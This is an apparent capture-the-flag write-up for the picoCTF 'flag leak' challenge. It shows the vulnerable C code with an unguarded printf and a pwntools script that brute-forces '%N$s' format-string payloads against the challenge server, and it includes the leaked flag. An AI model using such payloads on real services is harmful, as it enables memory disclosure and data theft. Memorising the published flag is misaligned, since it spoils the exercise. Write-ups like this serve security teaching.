# flag leak

In this challenge from [picoCTF](https://play.picoctf.org/practice/challenge/269) we need exploit a format string vulnerability in order to leak data from the stack.

Looking at the source code we can see that the flag is load into the stack before  the vulnerable call to `printf(story);`:

```c
void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

We can exploit it using `%s` wich can leak memory content by interpreting a stack or memory address as a string pointer.

I just created a bruteforce script, even tho it is a terrible approach it is easy and it works.

# Solve.py

```py
from pwn import *

def test_payload(i):
    r = remote("saturn.picoctf.net", 51076)
    r.sendline(f"%{i}$s".encode())
    return r.recvall()

i = 0
context.log_level = 'error'

while True:
    res = test_payload(i)
    if b"pico" in res or b"}" in res:
        print(res)
    i += 1
```

The script gave me this output:

```
❯ python3 solve.py
b"Tell me a story and then I'll tell you one >> Here's a story - \nCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \n\x87(\xad\xfbg}\x8a\xecg}\x8a\xecg}\x8a\xecg}\x8a\xecg}\x8a\xecg}\x8a\xecg}\x8a\xech}\x8a\xec\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \nl}\x1e\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \nl}\x1e\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \nl}\x1e\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \nl}\x1e\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \nl}\x1e\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \n\x10\xbf\x04\x08\x909\xe2\xf2\xc0\xda\xe0\xf20\xed\xc4\xf2\xb0\xa3\xc6\xf2@}\xcc\xf2\xe0\xc1\xc6\xf2\x80\x90\x04\x08\xe0\x9d\xc1\xf2\xc0\xc9\xc6\xf2p\xa6\xc6\xf2\xc0\x90\x04\x08\xd0\xfd\xc4\xf2\xa0\x81\xcc\xf2\n"
b"Tell me a story and then I'll tell you one >> Here's a story - \nFLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_\n"
^C
```

And I could retrieve the flag combining the first and last line.